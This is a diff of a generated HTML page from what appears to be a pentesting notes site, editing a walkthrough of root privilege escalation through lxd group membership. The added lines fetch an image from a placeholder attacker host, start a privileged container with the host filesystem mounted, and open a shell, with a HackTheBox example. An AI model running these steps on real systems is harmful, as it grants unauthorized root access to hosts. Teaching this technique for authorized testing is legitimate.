@@ -17791,11 +17791,26 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
+  <a href="#create-our-own-container-with-alpine-and-transfer-it-to-the-target-system" class="md-nav__link">
+    <span class="md-ellipsis">
+      Create our own container with Alpine and transfer it to the target system
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Create our own container with Alpine and transfer it to the target system">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
   <a href="#example-from-hackthebox" class="md-nav__link">
     <span class="md-ellipsis">
       Example from HackTheBox
     </span>
   </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
         
@@ -19520,11 +19535,26 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
+  <a href="#create-our-own-container-with-alpine-and-transfer-it-to-the-target-system" class="md-nav__link">
+    <span class="md-ellipsis">
+      Create our own container with Alpine and transfer it to the target system
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Create our own container with Alpine and transfer it to the target system">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
   <a href="#example-from-hackthebox" class="md-nav__link">
     <span class="md-ellipsis">
       Example from HackTheBox
     </span>
   </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
         
@@ -19587,12 +19617,13 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 
 
 <h1 id="lxd">lxd</h1>
-<p>LXD is similar to Docker and is Ubuntu's container manager. LXD is a management API for dealing with LXC containers on Linux systems. It will perform tasks for any members of the local lxd group. It does not make an effort to match the permissions of the calling user to the function it is asked to perform.</p>
-<p>A member of the local “lxd” group can instantly escalate the privileges to root on the host operating system. This is irrespective of whether that user has been granted sudo rights and does not require them to enter their password. The vulnerability exists even with the LXD snap package.</p>
+<p>Linux Daemon (<a href="https://github.com/lxc/lxd">LXD</a>) is similar to Docker and is Ubuntu's container manager. LXD is a management API for dealing with LXC containers on Linux systems. It will perform tasks for any members of the local lxd group. It does not make an effort to match the permissions of the calling user to the function it is asked to perform.</p>
+<p>Before we can use this service to escalate our privileges, we must be in either the <code>lxc</code> or <code>lxd</code> group.</p>
 <p><a href="https://www.hackingarticles.in/lxd-privilege-escalation/">Source: https://www.hackingarticles.in/lxd-privilege-escalation/</a>. In this article, you can find a good explanation about how lxc works. <a href="https://bugs.launchpad.net/ubuntu/+source/lxd/+bug/1829071">Original source: https://bugs.launchpad.net/ubuntu/+source/lxd/+bug/1829071</a>.</p>
 <h2 id="privileges-escalation">Privileges escalation</h2>
 <p>Privilege escalation through lxd requires the access of local account and that that local account belongs to the group lxd.</p>
-<p>In order to take escalate the root privilege of the host machine you have to create an imag for lxd thus you need to perform the following the action:</p>
+<h3 id="create-our-own-container-with-alpine-and-transfer-it-to-the-target-system">Create our own container with Alpine and transfer it to the target system</h3>
+<p>In order to take escalate the root privilege of the host machine you have to create an image for lxd thus you need to perform the following the action:</p>
 <p><strong>Steps to be performed on the attacker machine:</strong></p>
 <div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span>
 <span class="normal"><a href="#__codelineno-0-2">2</a></span>
@@ -19630,7 +19661,10 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <span class="normal"><a href="#__codelineno-1-17">17</a></span>
 <span class="normal"><a href="#__codelineno-1-18">18</a></span>
 <span class="normal"><a href="#__codelineno-1-19">19</a></span>
-<span class="normal"><a href="#__codelineno-1-20">20</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="c1"># Download the alpine image. Go for instance to the /tmp folder and, if you have started the apache2 service in the attacker machine, do a wget:</span>
+<span class="normal"><a href="#__codelineno-1-20">20</a></span>
+<span class="normal"><a href="#__codelineno-1-21">21</a></span>
+<span class="normal"><a href="#__codelineno-1-22">22</a></span>
+<span class="normal"><a href="#__codelineno-1-23">23</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="c1"># Download the alpine image. Go for instance to the /tmp folder and, if you have started the apache2 service in the attacker machine, do a wget:</span>
 </span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2"></a>wget<span class="w"> </span>http://AtackerIP//alpine-v3.17-x86_64-20230508_0532.tar.gz
 </span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3"></a>
 </span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4"></a><span class="c1"># After the image is built it can be added as an image to LXD as follows:</span>
@@ -19650,27 +19684,38 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18"></a>
 </span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19"></a><span class="c1"># Launch a shell command in the container</span>
 </span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20"></a>lxc<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>ignite<span class="w"> </span>/bin/sh
+</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21"></a>
+</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22"></a><span class="c1"># Access the system via </span>
+</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23"></a>ls<span class="w"> </span>-l<span class="w"> </span>/mnt/root
 </span></code></pre></div></td></tr></table></div>
-<h3 id="example-from-hackthebox">Example from HackTheBox</h3>
+<h4 id="example-from-hackthebox">Example from HackTheBox</h4>
 <p>Unzip the Alpine image.</p>
 <div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a><span class="go"> unzip alpine.zip </span>
 </span></code></pre></div></td></tr></table></div>
 <p>Start the LXD initialization process. Choose the defaults for each prompt. Consult this <a href="https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04">post</a> for more information on each step.</p>
-<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a><span class="go">lxd init</span>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span>
+<span class="normal"><a href="#__codelineno-3-2">2</a></span>
+<span class="normal"><a href="#__codelineno-3-3">3</a></span>
+<span class="normal"><a href="#__codelineno-3-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a><span class="go">lxd init</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3"></a><span class="gp"># </span>List<span class="w"> </span>available<span class="w"> </span>images
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4"></a><span class="go">lxc image list</span>
 </span></code></pre></div></td></tr></table></div>
 <p>Import the local image.</p>
-<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="go">lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine</span>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="go">lxc image import alpine.tar.gz --alias alpine</span>
 </span></code></pre></div></td></tr></table></div>
 <p>Start a privileged container with the <code>security.privileged</code> set to <code>true</code> to run the container without a UID mapping, making the root user in the container the same as the root user on the host.</p>
 <div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a><span class="go">lxc init alpine r00t -c security.privileged=true</span>
 </span></code></pre></div></td></tr></table></div>
 <p>Mount the host file system.</p>
-<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a><span class="go"> lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true</span>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a><span class="go">lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true</span>
 </span></code></pre></div></td></tr></table></div>
 <p>Finally, spawn a shell inside the container instance. We can now browse the mounted host file system as root.</p>
 <div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span>
-<span class="normal"><a href="#__codelineno-7-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a><span class="go">lxc start r00t</span>
+<span class="normal"><a href="#__codelineno-7-2">2</a></span>
+<span class="normal"><a href="#__codelineno-7-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a><span class="go">lxc start r00t</span>
 </span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2"></a><span class="go">lxc exec r00t /bin/sh</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3"></a><span class="go">ls -l /mnt/root</span>
 </span></code></pre></div></td></tr></table></div>
 <h2 id="docker">Docker</h2>
 <p>Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers:</p>
@@ -19700,7 +19745,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2025-02-12T20:36:23+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2025-02-12</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2025-02-16T21:39:54+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2025-02-16</span></small></br>
 
 
     <small>Created: May 8, 2023 12:58:10</small>
